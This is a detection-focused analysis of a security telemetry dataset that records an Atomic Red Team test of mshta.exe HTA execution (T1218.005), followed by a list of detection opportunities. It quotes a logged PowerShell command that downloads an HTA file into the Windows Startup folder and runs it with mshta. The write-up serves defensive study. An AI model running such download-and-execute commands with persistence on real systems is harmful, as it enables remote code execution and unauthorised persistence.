# T1218.005-3: Mshta — HTA

## Technique Context

T1218.005 involves using mshta.exe, a signed Microsoft binary that can execute HTML Applications (HTA files) containing embedded scripts. This technique is particularly valuable to adversaries because mshta.exe can bypass application whitelisting and execute arbitrary code from local files or remote URLs. The detection community focuses on mshta process creation with unusual command lines, network connections to unexpected domains, file writes to common persistence locations, and parent-child relationships indicating spawning from suspicious processes like PowerShell or Office applications.

## What This Dataset Contains

The dataset captures a complete execution chain where PowerShell downloads an HTA file from GitHub and executes it via mshta.exe. The attack begins with Security event 4688 showing PowerShell spawning with the full command line: `"powershell.exe" & {$var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"; $var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"; mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"...}`.

PowerShell event 4103 shows the failed web request: `CommandInvocation(Invoke-WebRequest): "Invoke-WebRequest" ParameterBinding(Invoke-WebRequest): name="Uri"; value="https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta" TerminatingError(Invoke-WebRequest): "Object reference not set to an instance of an object."` followed by event 4100 indicating the Invoke-WebRequest failure.

Despite the web request failure, the technique proceeds with Sysmon event 11 showing file creation: `TargetFilename: C:\Windows\System32\config\systemprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta`. This placement in the Startup folder indicates persistence intent.

The core technique evidence appears in Sysmon event 1: `ProcessCreate: Image: C:\Windows\System32\mshta.exe CommandLine: "C:\Windows\system32\mshta.exe" "C:\Windows\system32\config\systemprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"` with the parent process being PowerShell.

Network telemetry shows DNS resolution for `raw.githubusercontent.com` in Sysmon event 22 and a TCP connection to `185.199.109.133:443` in event 3, confirming the attempted remote file retrieval.

## What This Dataset Does Not Contain

The dataset lacks evidence of successful HTA execution because the web request failed, so no actual malicious payload was downloaded or executed. There are no process creation events showing calc.exe or any other payload spawned by mshta.exe, and no additional network connections or file modifications that would indicate successful code execution within the HTA environment. The Stop-Process commands targeting calculator processes show no matching processes were found, confirming the payload never executed.

Missing are any registry modifications, additional persistence mechanisms, or lateral movement activities that might occur in a real attack scenario. The dataset also doesn't contain any Windows Defender alerts or blocks, suggesting the technique attempt flew under the radar despite the endpoint protection being active.

## Assessment

This dataset provides excellent telemetry for detecting T1218.005 attempts, even when they partially fail. The combination of Security 4688 events with command-line logging, PowerShell operational logs, Sysmon process creation and file creation events creates a comprehensive picture of the attack chain. The network telemetry from Sysmon events 3 and 22 adds valuable context about remote file retrieval attempts. 

The dataset would be stronger if it included a successful execution scenario to show the complete attack lifecycle, including payload execution and post-exploitation activities. However, the failed attempt still demonstrates key detection opportunities around mshta.exe abuse patterns.

## Detection Opportunities Present in This Data

1. **Process creation monitoring** - Security 4688 and Sysmon 1 events showing mshta.exe spawned by PowerShell with HTA file arguments, particularly when the file path includes user writable directories.

2. **PowerShell script block analysis** - Event 4104 capturing the complete attack script including Invoke-WebRequest, file operations, and mshta execution in a single command block.

3. **Suspicious file creation** - Sysmon 11 events showing HTA files written to Startup folders or other persistence locations, especially when created by scripting engines.

4. **Network behavior correlation** - Sysmon 22 DNS queries and event 3 network connections from PowerShell to external domains immediately followed by mshta.exe execution.

5. **Parent-child process relationships** - Detecting mshta.exe spawned by non-standard parents like PowerShell, cmd.exe, or Office applications using process tree analysis.

6. **Command line pattern matching** - Identifying mshta.exe command lines pointing to recently created files or files in unusual locations like temp directories or user AppData paths.

7. **PowerShell module logging** - Event 4103 showing Invoke-WebRequest followed by Out-File operations targeting file extensions associated with executable content like .hta files.
